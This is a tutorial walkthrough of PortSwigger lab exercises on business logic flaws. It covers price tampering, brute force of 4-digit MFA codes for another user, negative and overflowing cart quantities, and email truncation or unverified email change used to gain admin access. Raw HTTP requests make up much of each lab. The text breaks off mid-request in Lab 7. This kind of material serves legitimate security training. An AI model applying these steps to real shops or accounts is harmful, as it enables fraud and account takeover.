
# Business Logic Vulnerabilities Labs

As we talk about before business logic vulnerabilities are very specific to the context in which they occur. However, all the business logic flaws show some common patterns that can be used to detect them. Now we do some labs and get more insights on business logic flaws.

## Excessive trust in client-side controls

As we discussed previously many instances of business logic flaws occur due to the vision developers have that client only makes requests from browsers, and if they enforce some input validation and other checks on the client side i.e., JavaScript or other client-side scripting language they only get valid inputs. This vision leads to business logic flaws that can be exploited using in-between browser proxies like Burp Repeater, Zap proxy Resend Request Editor and other tools like curl and browsers in build request editor in Dev tools can also be used to send malformed requests to the server.

As the developer only enforces the validation on the client side by using the above poxy tools, they will bypass client side checks as they didn't abide by any client side languages they just get the valid request from the browser and then we can edit it just like we want. The edited request we sent to the server is not trusted and this could lead to some unintended behaviors according to the functionality.

Let's look at the lab on this topic to understand it more practically.

### LAB #1: Excessive trust in client-side controls

Lab URL: [Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)

**Given Credentials**
```
wiener:peter
```

**Objective:** Buy the "Lightweight l33t leather jacket" with unintended price

This lab contains a shopping application in which they have a different number of products to sell. They have a My Account functionality in which we can login to our account. We can view details of the product i.e. description and price details and we can also specify the product quantity to buy it by clicking the "Add to cart" button.

The **Add to cart** functionality sends a POST request in which they specify the parameters like `productId`, `redir`, `quantity`, and `price`. The whole request looks like the following.

```
POST /cart HTTP/2
Host: 0a1d007c044d9c0983f073c00087008f.web-security-academy.net
Cookie: session=UWjUHWC8vub5auO5xC4TvUq3suBXtB5B
Content-Length: 46
Origin: https://0a1d007c044d9c0983f073c00087008f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36

productId=1&redir=PRODUCT&quantity=1&price=133700
```

If we check our cart by viewing the `/cart`  endpoint or by clicking a "cart" button on the site they indeed add the product to our `cart` and we can place our order from there and increase the quantity if we want and remove the product from the cart. One thing to note is the price there is `1337.00` but if we see the POST request above the price there is `133700` so that means the last two digits are decimal.

If we intercept the request in Burp Repeater and change the price to anything like `100` and see our cart we see the cart has the product but this time there price is only `1.00`. So by exploiting this flaw, we can easily change product prices. In this lab, we see what happens if developers have excessive trust in the client side.

### LAB #2: 2FA broken logic

Lab URL: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

Given Credentials
```
wiener:peter
```

Victim's username: `carlos`

This lab has a login functionality in which we can use a username and password. If any of these would be incorrect an error message is shown.

```
Incorrect username or password.
```

when the username and password are correct they redirect us to the `/login2` endpoint and set the cookie `verify=[username]` and session cookie `session=[session value here]`. The exact request and response look like the following.

```
POST /login HTTP/2
Host: 0a3d00cc03f7404ac10e3a54004a00d4.web-security-academy.net
Cookie: session=vbwYd2e4pHU9zwS7DTN1Tycm724KaM0l
Content-Length: 30
Origin: https://0a3d00cc03f7404ac10e3a54004a00d4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

username=wiener&password=peter
```

```
HTTP/2 302 Found
Location: /login2
Set-Cookie: verify=wiener; HttpOnly
Set-Cookie: session=S1SDZaLeZsSKXJ3M7bVnq3Hfv1Yg9id2; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

The `/login2` endpoint generates the `mfa-code` for the username specified in the cookie and sent that code to its email account. We can send that `mfa-code` with the POST request like the following.
```
POST /login2 HTTP/2
Host: 0a3d00cc03f7404ac10e3a54004a00d4.web-security-academy.net
Cookie: verify=wiener; session=S1SDZaLeZsSKXJ3M7bVnq3Hfv1Yg9id2
Content-Length: 13
Origin: https://0a3d00cc03f7404ac10e3a54004a00d4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

mfa-code=0102
```

If the code is correct they will redirect us to `/my-account`.

```
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=TKgrNSLUO1oq9COyQyerjbny5lTEZDjS; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

If the code is not correct they show an error message.

```
Incorrect MFA code.
```

The site doesn't enforce any MFA brute force protection and the MFA code is only 4 digit code so we can easily brute force any user's code and access its account using the following method.

> - Sent the GET request to the `/login2` endpoint with the cookie set to the victim username.
```
GET /login2 HTTP/2
Host: 0a3d00cc03f7404ac10e3a54004a00d4.web-security-academy.net
Cookie: verify=carlos; session=S1SDZaLeZsSKXJ3M7bVnq3Hfv1Yg9id2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
```

This will generate an MFA code for that user.

> - Now we can brute force that user mfa-code by sending the POST request to the intruder with the victim username.
> - And the payload position to mfa-code.
> - Use a simple list as an attack type
> - Load the list of 4-digit codes i.e `SecLists/Fuzzing/4-digits-0000-9999.txt`
> - Start the attack.
> - The successful code should redirect us to `/my-account` and the redirection request status code is 302 so we can add a filter to only show the `3xx` code.

When you see the successful request right click on it and click show response in the browser option and copy the link and paste it into your browser and solve the lab. In this lab, we see the developer's flawed logic that only authorized user MFA code is generated using session cookies for login users but that is not the case attacker can easily generate MFA code for other users and bruteforce that code to access its account.

## Failing to handle unconventional input

Based on the application sometimes it is mandatory to only accept some trusted data from the user that includes only numbers, strings, or alphanumeric numbers only. If by any chance application is failed to do so that could lead to some unintended circumstances like the following.

Consider a banking application in which the user can send a transfer to another account by checking the current balance. Let's say the example code looks like following

```php
$transferAmount = $_POST['amount'];
$currentBalance = $user->getBalance();
if ($transferAmount <= $currentBalance) {
// Complete the transfer 
}
else {
// Block the transfer: insufficient funds 
}
```

So the logic said first to get the amount from the user and check if that amount is less than or equal to the current user balance amount, if the amount meets that criteria they transfer the amount otherwise they reject it and throw an error `insufficient funds`. In this example, the developer must enforce that the amount must be a positive integer on the server side if they only validate it on the client side this could lead to a logic flaw.

The attacker intercepts the request and changes the amount to a negative amount and that will pass the criteria of the transfer amount being equal to or less the current balance because the amount is negative and the balance is positive. The negative amount sent to another account may result in deducting its balance other than increasing it.

This is only one example of logic flaws due to failure to validate input there are some other vulnerabilities also that occur due to supplying decimal numbers, and symbols like hyphens `-`, comma `,`. This type of vulnerability also occurs in other places like upload functionality in which they upload server-side files that give them remote code execution.

To find this vulnerability in a black box manner we can supply the unconventional input like above and also supply values in ranges that legitimate users are unlikely to ever enter. This includes exceptionally high or exceptionally low numeric input and abnormally long strings for text-based fields. Try playing with unexpected data types. Using that we should see something in the application response if they are vulnerable. In the short term remember the following points.

- Are there any limits that are imposed on that data?
- What happens when you reach those limits?
- Is any transformation or normalization being performed on your input?

This may expose weak input validation that allows you to manipulate the application in unusual ways. Keep in mind that if you find one form on the target website that fails to safely handle unconventional input, it's likely that other forms will have the same issues.

### LAB #3: High-level logic vulnerability

Lab URL: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level

Given Credentials

```
wiener: peter
```

Objective:

Buy the "Lightweight l33t leather jacket" at an unintended price.

This lab contains a shopping application in which they have a different number of products to sell. They have a My Account functionality in which we can login to our account. We can view details of the product there they have a description and its price details. We can also specify the quantity value after that we can add the product and the quantity to our cart.

The **Add to cart** functionality sends a POST request in which they specify the parameters like `productId`, `redir`, `quantity`, and `price`. The whole request looks like the following.

```
POST /cart HTTP/2
Host: 0a0e0044046bfe84804aeacb00ec0010.web-security-academy.net
Cookie: session=HlHuJEp1YaBlx1NQn5wnlq3LKS2pMhOq
[Redacted]

productId=1&redir=PRODUCT&quantity=1
```

After that we can do a checkout from the`/cart` endpoint. The checkout request is like the following.

```
POST /cart/checkout HTTP/2
Host: 0a0e0044046bfe84804aeacb00ec0010.web-security-academy.net
Cookie: session=HlHuJEp1YaBlx1NQn5wnlq3LKS2pMhOq
[Redacted]

csrf=PZfsfXP2aNIzWZ6ZwGiGRcSLo0QstctC
```

If we supply a negative value in the quantity parameter we see they minus the quantity in our product. Like we send the following request

```
POST /cart HTTP/2
Host: 0a0e0044046bfe84804aeacb00ec0010.web-security-academy.net
Cookie: session=HlHuJEp1YaBlx1NQn5wnlq3LKS2pMhOq
[Redacted]

productId=1&redir=PRODUCT&quantity=5
```

And after that, we send this request

```
POST /cart HTTP/2
Host: 0a0e0044046bfe84804aeacb00ec0010.web-security-academy.net
Cookie: session=HlHuJEp1YaBlx1NQn5wnlq3LKS2pMhOq
[Redacted]

productId=1&redir=PRODUCT&quantity=-6
```

We will see our cart now has a product that has quantity `-1` with a negative price. So we can exploit this functionality by giving negative input that makes our cart price negative and then adding a new product with a positive price. Doing that causes the application to minus that negative value from the positive value. The final price will be much less than the actual price and we can buy the product with that price. Chaining that theory we can solve this lab using the following steps.

```
POST /cart HTTP/2
Host: 0a0e0044046bfe84804aeacb00ec0010.web-security-academy.net
Cookie: session=HlHuJEp1YaBlx1NQn5wnlq3LKS2pMhOq
[Redacted]

productId=1&redir=PRODUCT&quantity=1
```

Now send the other product to our cart like this

```
POST /cart HTTP/2
Host: 0a0e0044046bfe84804aeacb00ec0010.web-security-academy.net
Cookie: session=HlHuJEp1YaBlx1NQn5wnlq3LKS2pMhOq
[Redacted]

productId=2&redir=PRODUCT&quantity=5
```

There we change the product Id and they send other products to our cart. Now we send the following request.

```
POST /cart HTTP/2
Host: 0a0e0044046bfe84804aeacb00ec0010.web-security-academy.net
Cookie: session=HlHuJEp1YaBlx1NQn5wnlq3LKS2pMhOq
[Redacted]

productId=1&redir=PRODUCT&quantity=-6
```

This will add the product with a negative cart value that could change our price. Now we can send the above request again and again until we see the cart price is enough for us to purchase. When our cart is enough to purchase then click on checkout and solve the lab.

In this lab we see the developer doesn't validate our input on the server side and that causes this attack to be successful.

### LAB #4: Low-level logic flaw

Lab URL: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level

**Given Credential**
```
wiener:peter
```

**Objective**
Purchase the `Lightweight l33t leather jacket` with an unintended price by exploiting a business logic flaw.

This lab contains a shopping application in which they have a different number of products to sell. They have a My Account functionality in which we can login to our account. We can view details of the product on its Home page, there they have Description and its price details. We can also specify the quantity value after that we can add the product and the quantity to our cart.

The **Add to cart** functionality sends a POST request in which they specify the parameters like `productId`, `redir`, `quantity`, and `price`. The whole request looks like the following.

```
POST /cart HTTP/2
Host: 0a9b00f903d3937a8142208d00bb0037.web-security-academy.net
Cookie: session=f1CWmx9nogLrI2C1JW6qcPqCU3qwWtjr
Origin: https://0a9b00f903d3937a8142208d00bb0037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

productId=1&redir=PRODUCT&quantity=1
```

We can also remove the item from the cart and their request look like following

```
POST /cart HTTP/2
Host: 0a9b00f903d3937a8142208d00bb0037.web-security-academy.net
Cookie: session=f1CWmx9nogLrI2C1JW6qcPqCU3qwWtjr
Content-Length: 36
Origin: https://0a9b00f903d3937a8142208d00bb0037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

productId=1&quantity=-1&redir=CART
```

Like the previous lab, we can also remove items from the cart using negative values but unlike the previous one, we cannot pass a larger quantity value than the cart has. If our cart has a `1` item and we remove a `-2` item they will clear our cart not add a price like the previous lab. We can send the POST request to **Intruder** and clear all payload positions, In the **Payload** section tab select **Payload Type** to **Null Payloads** and check the **Continue indefinitely**. This will keep sending the request, make sure your update the quantity to `99` and start the attack. The intruder request looks like the following.

```
POST /cart HTTP/2
Host: 0a9b00f903d3937a8142208d00bb0037.web-security-academy.net
Cookie: session=f1CWmx9nogLrI2C1JW6qcPqCU3qwWtjr
Content-Length: 36
Origin: https://0a9b00f903d3937a8142208d00bb0037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

productId=1&redir=PRODUCT&quantity=99
```

As you can see we didn't add any position and our quantity value was set to `99`. Now send the `GET /cart` request to the burp repeater and send it. Below on the search bar search for the `Total:` value and click on the Setting icon, there check `Auto scroll to match when the text changes`. Sending the GET request again and again to see what happens to the price you will see after some time the cart value becomes negative. Keep sending the request until the price value is decrementing. When you are close to positive value stop the intruder and send the other product to your cart with the following request.

```
POST /cart HTTP/2
Host: 0a9b00f903d3937a8142208d00bb0037.web-security-academy.net
Cookie: session=f1CWmx9nogLrI2C1JW6qcPqCU3qwWtjr
Content-Length: 36
Origin: https://0a9b00f903d3937a8142208d00bb0037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

productId=13&redir=PRODUCT&quantity=1
```

Set the quantity value on your own so that the cart value becomes positive. If by any chance they become bigger than our current balance just remove a few items and you will see you have enough balance to buy it, Check out the cart and solve the lab.

### LAB #5: Inconsistent handling of exceptional input

Lab URL: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input

Objective: Exploit logic flaw to get administrator functionality and delete the user `carlos`.

This lab contains a shopping application in which they have a different number of products to sell. They have a My Account functionality in which we can login to our account and also they have a registered functionality in which we can register a new account by giving him a username, email, and password. In their `/register` endpoint, they also mentioned something like the following.

> `If you work for DontWannaCry, please use your @dontwannacry.com email address`.

They clearly mentioned if we are working for `dontwanacry` we have to use their domain email instead of the email domain they provide us in this lab i.e `attacker@exploit-0ac7006a03774de781cf48ef01bb0020.exploit-server.net`.

The normal register request looks like the following.

```
POST /register HTTP/2
Host: 0a5a00e6033f4d49815f495b000b0036.web-security-academy.net
Cookie: session=8ZeEl62eJXEmw7NLgew6OUdhK4NuHdox
Content-Length: 393
Origin: https://0a5a00e6033f4d49815f495b000b0036.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36

csrf=feIxtRe1eH6fTIQJUlvqZUlytulSnQqO&username=test&email=test%40exploit-0ac7006a03774de781cf48ef01bb0020.exploit-server.net&password=test
```

There they first required a `csrf` token that is properly tied to the user session and we must have a correct `csrf` token to register successfully otherwise they throw some error. The other things they required were a `username`, `email`, and the `password`. When we successfully register they send an activation email to our lab-provided `email` client and we can activate our user from there. The token is like the following.

```
https://0a5a00e6033f4d49815f495b000b0036.web-security-academy.net/register?temp-registration-token=afd05645afad0154540asd442s0d0z
```

When our `user` is successfully registered then we can login to our account using the `/login` endpoint. The login request will look like the following.

```
POST /login HTTP/2
Host: 0a5a00e6033f4d49815f495b000b0036.web-security-academy.net
Cookie: session=8ZeEl62eJXEmw7NLgew6OUdhK4NuHdox
Content-Length: 393
Origin: https://0a5a00e6033f4d49815f495b000b0036.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36

csrf=feIxtRe1eH6fTIQJUlvqZUlytulSnQqO&username=test&password=test
```

There they asked for only a `username` and `password` if both are correct they redirected us to the `/my-account` endpoint and give us a successful login. There we can see our current email address reflected back to us. Every time user-supplied input is reflected back to the user we should test for different attacks i.e. `XSS` and `SSTI` but we can talk about it on other topics.

For this lab they mentioned if we work for `DontWanaCry` we have to use `@dontwanacry.com` domain for this we have to test that if any way we can change our email to this domain instead of our lab-provided email. First, we can try to check if there is any length limit specified in the email i.e. Can we use 100 or 200+ characters in our email? For that, we can send a big number of characters in our email like the following.

```
POST /register HTTP/2
Host: 0a5a00e6033f4d49815f495b000b0036.web-security-academy.net
Cookie: session=8ZeEl62eJXEmw7NLgew6OUdhK4NuHdox
Content-Length: 393
Origin: https://0a5a00e6033f4d49815f495b000b0036.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36

csrf=feIxtRe1eH6fTIQJUlvqZUlytulSnQqO&username=test1&email=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%40exploit-0ac7006a03774de781cf48ef01bb0020.exploit-server.net&password=test
```

As you can see above we use lots of `A` in our email and send that request to the server.  They didn't give us any error and sent the activation code to our email server. In our email server, we received the activation link and after clicking on it our account is also get registered. Everything is normal in login process the except for the reflected email this time they didn't show us the full email that we use in the registration process. They cut the email and only show us the email like the following.

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%40exploit-0ac70
```

Where the end part of our email goes? did they cut it, I don't know anything about that but one thing is for sure they add some string limitation in the email. From the above email, we see they strip the last email characters and we can calculate the number of characters they accept, so what if we make an email that will look like the following?

```
[Random String]@dontwanacry.com.[Our Lab Providing Email]
```

There we add a random string from the start and then add `@dontwanacry.com` in it and then use our lab-provided email client email as a subdomain in it like the following.

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8A%40dontwannacry.com.exploit-0ac7006a03774de781cf48ef01bb0020.exploit-server.net
```

> **Note:** The offset number may be different in your lab for me the total length of the Random string is  `238` and after that, I use `@dontwanacry.com` and exploit server email.

The request looks like the following.

```
POST /register HTTP/2
Host: 0a5a00e6033f4d49815f495b000b0036.web-security-academy.net
Cookie: session=8ZeEl62eJXEmw7NLgew6OUdhK4NuHdox
Content-Length: 393
Origin: https://0a5a00e6033f4d49815f495b000b0036.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36

csrf=feIxtRe1eH6fTIQJUlvqZUlytulSnQqO&username=test1234&email=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8A%40dontwannacry.com.exploit-0ac7006a03774de781cf48ef01bb0020.exploit-server.net&password=test
```

When I register that account and login I see they strip the `.exploit-0ac7006a03774de781cf48ef01bb0020.exploit-server.net` part and only show my email like the following. 

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8A@dontwannacry.com
```

And also we see our `my-account` dashboard change now they have an `Admin Panal` location in it, where we can delete user's accounts. From there delete the user `carlos` to solve the lab.

In this lab, we see they are unable to handle unconventional input and we exploit that to get the admin level permissions.

## Making flawed assumptions about user behavior

Developers often make assumptions about user behavior and develop the platform using that assumption. This will often lead to different logical flaws. For this section, we will see some examples in which developers flawed assumptions lead to vulnerabilities.

### Trusted users won't always remain trustworthy

Let's take a scenario in which the developer has some knowledge about common web application vulnerability and for that they take some robust measures to enforce the business rules and in that way, they think their application is secure. for example, they know about common SQL injection vulnerabilities and implement prepared statements in their login functionality but didn't add them in other places. As they don't know about other types of SQLi vulnerabilities like Second order SQLi so attackers add the SQL injection syntax in their profile fields like username, description, etc, and execute the SQL query by going to some other page.

There we see they implement robust measure but unfortunately, they didn't enforce it in all over the application. They assume if the user is register successfully they are trusted but this assumption leads to a vulnerability.

### LAB #6: Inconsistent security controls

**Lab URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls

**Objective:** Exploit the logic flaw vulnerability to access the administrative functionality to delete user carlos.

This lab contains a shopping application in which they have a different number of products to sell. They have a My Account functionality in which we can login to our account and also they have a registered functionality in which we can register a new account by giving him a username, email, and password. In their `/register` endpoint, they also mentioned something like the following.

> `If you work for DontWannaCry, please use your @dontwannacry.com email address`.

They clearly mentioned if we are working for `dontwanacry` we have to use their domain email instead of the email domain they provide us in this lab i.e `attacker@exploit-0a9100ba035129b881580c58015c0057.exploit-server.net`.

The Normal Register request looks like the following.

```
POST /register HTTP/2
Host: 0a2400b603ac297081b30dd000b7004a.web-security-academy.net
Cookie: session=1yLgJwMDSEnRhnYxq8IuLFEkq6S3GiDS
Content-Length: 708
Origin: https://0a2400b603ac297081b30dd000b7004a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36

csrf=5fm6HqhbTydRe10WaDOOCR0GpxletOix&username=test&email=attacker%40exploit-0a9100ba035129b881580c58015c0057.exploit-server.net&password=test
```

There they first required a `csrf` token that is properly tied to the user session and we must have a correct `csrf` token to register successfully otherwise they throw some error. The other things they required are a `username`, `email`, and the `password`. When we successfully register they send an activation email to our lab-provided `email` client and we can activate our user from there. The token and the whole will look like the following.

```
https://0a2400b603ac297081b30dd000b7004a.web-security-academy.net/register?temp-registration-token=GDgAOTlzv73fERwCIkK1MUpViDoGwOTP
```

When our `user` is successfully registered then we can login to our account using the `/login` endpoint. The login request will look like the following.

```
POST /login HTTP/2
Host: 0a2400b603ac297081b30dd000b7004a.web-security-academy.net
Cookie: session=WvcJKV2r2FH4umNXNP5lGoMENafuVRLL
Content-Length: 65
Origin: https://0a2400b603ac297081b30dd000b7004a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36

csrf=WHMQOc72hTpHDRjgT7ATePEOXGZtUMxA&username=test&password=test
```

There they asked for only a `username` and `password` if both are correct they redirected us to the `/my-account` endpoint and give us a successful login. After login, we can see again our current email address reflected back to us like the previous lab.

Let's test it with the attack we did in our previous lab. When sending a big string in our email we see this time they didn't strip email and handle it properly.

Unlike the previous lab this time they add an `Update Email` Functionality in which we can update our email address. The update email request looks like the following.

```
POST /my-account/change-email HTTP/2
Host: 0a2400b603ac297081b30dd000b7004a.web-security-academy.net
Cookie: session=x8cyTA3LHeuMDtm8BFTWSdK0s7AayL8S
Content-Length: 71
Origin: https://0a2400b603ac297081b30dd000b7004a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36

email=test3%40exploit-0a9100ba035129b881580c58015c0057.exploit-server.net&csrf=jdqarpaZOhoFGnxncnfmb4yQeyH1HEAF
```

There they required an `email` address and a `csrf` token. when we send this request to the server they didn't show any message to activate that email which means they didn't generate any confirmation link and send it to our email client. Let's submit the following email address now

```
attacker@dontwanacry.com
```

**Request:**
```
POST /my-account/change-email HTTP/2
Host: 0a2400b603ac297081b30dd000b7004a.web-security-academy.net
Cookie: session=x8cyTA3LHeuMDtm8BFTWSdK0s7AayL8S
Content-Length: 71
Origin: https://0a2400b603ac297081b30dd000b7004a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36

email=attacker%40dontwannacry.com&csrf=jdqarpaZOhoFGnxncnfmb4yQeyH1HEAF
```

Now they change our email address and we see we get the admin functionality in which we can delete a user account, delete the carlos user and solve the lab.

In this lab, we see the developer know about the previous attack path and they fix it so that we cannot access email functionality other than if we are from `DontWanaCry`. But they didn't enforce it in all its application functionality thinking users are trusted and this led to the vulnerability again.

### Users won't always supply mandatory input

Sometimes business logic flaws occur due to a misconception that users will pass the mandatory input. The developer adds some client site checks so that the user must pass the mandatory inputs in the forum, but we know attacker can temper with parameters in transmission.

If the developer doesn't add server-side checks then this could open the door for different logic flaws or vulnerabilities. The application code may have some logic that gets some values from users and execute some code based on that but the absence of any of that parameter may result, in the attacker accessing the code path that is not supposed to be out of reach.

To discover and test for that kind of vulnerability we should make sure the following checklist.

>- Only remove one parameter at a time to ensure all relevant code paths are reached.
>- Try deleting the name of the parameter as well as the value. The server will typically handle both cases differently.
>- Follow multi-stage processes through to completion. Sometimes tampering with a parameter in one step will have an effect on another step further along in the workflow.

This methodology applies to both `GET` and `POST` request parameters and if the application uses another method i.e. `PUT`, `UPDATE` etc.

### LAB #7: Weak isolation on dual-use endpoint

Lab URL: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint

**Objective**: Exploit the logic flaw to gain an `administrator` account and delete the user carlos.

**Given Credentials**: `wiener:peter`

This lab contains a blogging website that has some blogs. There is also a `My account` endpoint where we can see our current account information if we are `login` if not then they redirect us to the `/login` endpoint in which we can login by giving a `username` and `password` combination. If any of these are incorrect they give us an error message saying `Invalid username or password.`

When we successfully login they redirect us back to the `/my-account` endpoint where we have information about our current `username` and we have some functionality to Update our `Email address`, `Username`, and current `Password`.

The Update `Email Request` is like the following.

```
POST /my-account/change-email HTTP/2
Host: 0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Cookie: session=Q59XR716BAzndFSKs4ZCBG2YlM1m0JCj
Content-Length: 55
Origin: https://0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36

email=test%40test&csrf=jEV9rLFT2Whe6Gdv5xysswtviT67aIif
```

There they send an `email` parameter with our `email address` value and they also have a `csrf` token they must be correct otherwise they show us an error message saying `Invalid CSRF token`. When we successfully update our email we can see that email reflected back to us in our `/my-account` dashboard.

The Update `Password Request` is like the following.

```
POST /my-account/change-password HTTP/2
Host: 0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Cookie: session=Q59XR716BAzndFSKs4ZCBG2YlM1m0JCj
Content-Length: 118
Origin: https://0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36

csrf=jEV9rLFT2Whe6Gdv5xysswtviT67aIif&username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter
```

There they send a `crsf` token that must be correct, the `username` parameter, `current-password` parameter, `new-password-1`, and `new-password-2` parameter. If we change the username parameter value to some arbitrary username value i.e. `administrator` they show an error message saying `current password is incorrect`. 

**Request**
```
POST /my-account/change-password HTTP/2
Host: 0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Cookie: session=Q59XR716BAzndFSKs4ZCBG2YlM1m0JCj
Content-Length: 102
Origin: https://0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
